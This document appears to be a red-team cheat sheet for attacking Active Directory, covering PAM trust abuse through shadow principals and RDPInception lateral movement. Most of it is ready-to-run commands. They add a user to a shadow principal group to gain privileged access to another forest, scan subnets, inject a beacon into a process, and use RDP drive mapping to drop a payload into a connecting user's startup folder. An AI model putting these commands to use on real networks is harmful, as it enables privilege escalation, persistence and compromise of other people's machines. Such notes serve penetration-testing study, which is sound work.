- PAM trust provides the ability to access a forest with high privileges without using credentials of the current forest. Thus, better security for the bastion forest which is much desired.
- To achieve the above, Shadow Principals are created in the bastion domain which are then mapped to DA or EA groups SIDs in the production forest.

### Check if current domain is Bastion forest
#### Enumerate if the current domain is a bastion forest
- Run on the DC
- If there are trusts with the attributes ```ForestTransitive -eq $True``` and ```SIDFilteringQuarantined -eq $False``` check for Shadowprincipals. If there are then its a Bastion forest.
```
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
```

#### Check which users are members of the shadow principals
- Run on the DC
```
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
```

### Check if current domain is managed by bastion forest
- Now, TrustAttributes is a very good indicator. ```TAPT (TRUST_ATTRIBUTE_PIM_TRUST)``` is ```0x00000400``` (1024 in decimal) for PAM/PIM trust. If this bit and ```TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL (0x00000040)``` are set, the trust is a PAM trust. 
- A trust attribute of ```1096``` is for PAM ```(0x00000400)``` + External Trust ```(0x00000040)``` + Forest Transitive ```(0x00000008)```.
```
Get-ADTrust -Filter {(ForestTransitive -eq $True)}
```
 
### Abuse PAM trusts
- To abuse the PAM trust we must compromise users or groups who are part of the shadow security principals

### Enumerate shadow principals
- ```Name``` = name of the shadow principals
- ```member``` = members of the bastion forest which are mapped to the shadow principals (if empty add user to it)
- ```msDS-ShadowPrincipalSid``` = SID of the principal (user or group) in the user/production forest whose privileges are assigned to the shadow security principal.
```
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
```
 
#### Add member to shadow principal group
```
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | Select-Object name, DistinguishedName
Get-AdUser <USER> | Select-Object samaccountname, DistinguishedName
Set-ADObject -Identity "<DistinguishedName SHADOW>" -Add @{'member'="<DistinguishedName USER>"}

Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
```

#### Pssession to the other forest machine
- Note if Kerberos AES encryption is not enabled for the trust, we need to modify the WSMan TrustedHosts property and use Negotiate authentication for PSRemoting. ```-Authentication NegotiateWithImplicitCredential```
```
Enter-PSSession <FQDN> 
Enter-PSSession <FQDN> -Authentication NegotiateWithImplicitCredential
```
 
## RDPInception
#### Get foreign groups
```
Get-DomainForeignGroupMember -Domain <DOMAIN>
```
 
#### Check local groups on machines
- Run as DA!
```
Get-DomainGPOUserLocalGroupMapping -Identity "<GROUP>" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName
```
 
#### Check logon sessions on the host
```
net logons
```

#### Check network connections and processes
```
netstat -anop tcp | findstr 3389
ps
```

#### Scan the hosts/subnets in the other doamin
```
nmap -p 139,445,3389,5985 <CIDR>
```

#### Inject in one of the proccesses
```
inject <PID> x64 <BEACON>
```

#### Then move laterally through open ports or query the domain for other privilege escalation methods.
- SMB, winrm, kerberoasting, as-reproasting, password in description, ACL's etc.
- Even if user was not a local admin on any system, or if none of the juicy management ports were available, it can still be possible to move laterally via the established RDP channel. This is where the drive sharing comes into play.
 
### Drive mapping
- When a user enables drive sharing for their RDP session, it creates a mount-point on the target machine that maps back to their local machine. If the target machine is compromised, we may migrate into the user's RDP session and use this mount-point to write files directly onto their machine. This is useful for dropping payloads into their startup folder which would be executed the next time they logon.
- Works when users from a outbound trust RDP into a computer in the current domain with drive mapping.
 
#### Check the testclient C Drive
```
ls \\tsclient\c
```

#### Go to the startup folder of the user:
```
cd \\tsclient\c\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```
 
#### Upload paylaod
```
upload C:\Payloads\pivot.exe
```
 
